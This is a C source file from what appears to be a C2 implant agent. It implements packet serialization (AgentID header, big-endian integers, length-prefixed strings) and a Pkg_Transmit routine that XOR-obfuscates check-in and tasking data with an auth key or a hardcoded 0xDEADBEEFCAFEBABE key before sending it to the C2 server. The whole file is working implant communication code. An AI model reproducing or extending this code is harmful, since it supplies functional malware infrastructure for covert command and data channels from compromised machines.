#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>

// This handles the Packing the Data before sending it to C2 Server

//  static helpers (file-local, not exported)
// grow pkg->Buffer by 'extra' bytes, return pointer to the new space at the end
static PVOID Pkg_Grow( PPACKAGE pkg, UINT32 extra )
{
    pkg->Buffer = Heap_Realloc( pkg->Buffer, pkg->Length + extra );
    if ( !pkg->Buffer ) return nullptr;
    return (BYTE*)pkg->Buffer + pkg->Length;
}

// write 4 bytes big-endian (most significant byte first)
// the Go server reads integers with binary.BigEndian.Uint32 - must match
static void Write32( PVOID dst, UINT32 val )
{
    BYTE* b = (BYTE*)dst;
    b[0] = ( val >> 24 ) & 0xFF;
    b[1] = ( val >> 16 ) & 0xFF;
    b[2] = ( val >>  8 ) & 0xFF;
    b[3] = ( val       ) & 0xFF;
}

// write 8 bytes big-endian
static void Write64( PVOID dst, UINT64 val )
{
    BYTE* b = (BYTE*)dst;
    b[0] = ( val >> 56 ) & 0xFF;
    b[1] = ( val >> 48 ) & 0xFF;
    b[2] = ( val >> 40 ) & 0xFF;
    b[3] = ( val >> 32 ) & 0xFF;
    b[4] = ( val >> 24 ) & 0xFF;
    b[5] = ( val >> 16 ) & 0xFF;
    b[6] = ( val >>  8 ) & 0xFF;
    b[7] = ( val       ) & 0xFF;
}

// public Package functions

// Pad: raw copy of 'size' bytes with NO length prefix
// used for fixed-size fields (AgentID, TaskUUID) where server knows the size
DECLFN void Pkg_Pad( PPACKAGE pkg, PVOID data, UINT32 size )
{
    PVOID dest = Pkg_Grow( pkg, size );
    if ( !dest ) return;

    Mem_Copy( dest, data, size );
    pkg->Length += size;
}

// Create: allocate a new package and write the 36-byte AgentID header
// every packet the agent sends starts with the AgentID so the server knows who sent it
DECLFN PPACKAGE Pkg_Create( PCHAR agent_id )
{
    PPACKAGE pkg = (PPACKAGE)Heap_Alloc( sizeof(PACKAGE) );
    if ( !pkg ) return nullptr;

    pkg->Buffer   = Heap_Alloc( 1 );   // 1 byte seed - Heap_Realloc will grow it
    pkg->Length   = 0;
    pkg->TaskUUID = nullptr;

    // first 36 bytes of every packet = AgentID (raw, no length prefix)
    Pkg_Pad( pkg, agent_id, 36 );

    return pkg;
}

// Int32: append a 4-byte big-endian signed integer
DECLFN void Pkg_Int32( PPACKAGE pkg, INT32 val )
{
    PVOID dest = Pkg_Grow( pkg, 4 );
    if ( !dest ) return;

    Write32( dest, (UINT32)val );
    pkg->Length += 4;
}

// Int64: append an 8-byte big-endian signed integer
DECLFN void Pkg_Int64( PPACKAGE pkg, INT64 val )
{
    PVOID dest = Pkg_Grow( pkg, 8 );
    if ( !dest ) return;

    Write64( dest, (UINT64)val );
    pkg->Length += 8;
}

// Bytes: append [4-byte length][raw data]
// the server reads the 4-byte length first so it knows how many bytes follow
DECLFN void Pkg_Bytes( PPACKAGE pkg, PVOID data, UINT32 size )
{
    PVOID dest = Pkg_Grow( pkg, 4 + size );
    if ( !dest ) return;

    Write32( dest, size );
    Mem_Copy( (BYTE*)dest + 4, data, size );
    pkg->Length += 4 + size;
}

// Str: length-prefixed ASCII string (same as Bytes but takes a char*)
DECLFN void Pkg_Str( PPACKAGE pkg, PCHAR str )
{
    if ( !str ) return;

    UINT32 len = 0;
    while ( str[len] ) len++;   // count without strlen (no stdlib)

    Pkg_Bytes( pkg, str, len );
}

// Destroy: free the buffer then the package struct itself
DECLFN void Pkg_Destroy( PPACKAGE pkg )
{
    if ( !pkg ) return;
    if ( pkg->Buffer ) Heap_Free( pkg->Buffer );
    Heap_Free( pkg );
}

// Transmit: encrypt payload (everything after the 36-byte AgentID), then send to C2.
//
// Auth mode - first check-in (!Authenticated):
//   Insert 32-char ASCII hex of the auth key right after the UUID, then encrypt
//   the payload (everything after that prefix) with Crypt_XorKey(rawAuthKey).
//   Wire layout: [36 UUID][32 AUTH_HEX][XOR(rawKey, check-in data)]
//
// Auth mode - subsequent packets (Authenticated):
//   Encrypt payload with Crypt_XorKey(rawAuthKey).  No prefix.
//   Wire layout: [36 UUID][XOR(rawKey, data)]
//
// No-auth mode:
//   Legacy 8-byte cycling XOR with 0xDEADBEEFCAFEBABE.
DECLFN BOOL Pkg_Transmit( PPACKAGE pkg, PVOID *response, UINT32 *resp_size )
{
    G_AGENT;

    UINT32 encrypt_offset = 36;

    if ( Self->Config.AuthMode != 0 ) {
        if ( !Self->Session.Authenticated ) {
            // ---- First auth check-in: insert 32-byte hex prefix ----
            UINT32 payload_len = ( pkg->Length > 36 ) ? ( pkg->Length - 36 ) : 0;

            // Grow buffer to accommodate the 32-byte prefix
            pkg->Buffer = Heap_Realloc( pkg->Buffer, pkg->Length + 32 );
            if ( !pkg->Buffer ) return FALSE;

            PBYTE base = (PBYTE)pkg->Buffer;
            PBYTE akey = Self->Config.AuthKey;

            // Shift existing payload 32 bytes right (back-to-front to handle overlap)
            for ( INT32 i = (INT32)payload_len - 1; i >= 0; i-- )
                base[ 36 + 32 + i ] = base[ 36 + i ];

            // Write 32-char lowercase hex of AuthKey at position 36
            CHAR hx[] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };
            for ( int i = 0; i < 16; i++ ) {
                base[ 36 + i * 2     ] = hx[ akey[i] >> 4 ];
                base[ 36 + i * 2 + 1 ] = hx[ akey[i] & 0xF ];
            }

            pkg->Length    += 32;
            encrypt_offset  = 36 + 32; // encrypt payload only, not the key prefix

            if ( payload_len > 0 )
                Crypt_XorKey( base + encrypt_offset, payload_len, akey, 16 );

        } else if ( Self->Config.AuthKey ) {
            // ---- Authenticated: encrypt with auth key, no prefix ----
            if ( pkg->Length > encrypt_offset ) {
                Crypt_XorKey( (PBYTE)pkg->Buffer + encrypt_offset,
                              pkg->Length - encrypt_offset,
                              Self->Config.AuthKey, 16 );
            }
        }
    } else {
        if ( pkg->Length > encrypt_offset ) {
            Crypt_Xor( (PBYTE)pkg->Buffer + encrypt_offset,
                       pkg->Length - encrypt_offset,
                       0xDEADBEEFCAFEBABE );
        }
    }

    return Transport_Send( pkg->Buffer, pkg->Length, response, resp_size );
}
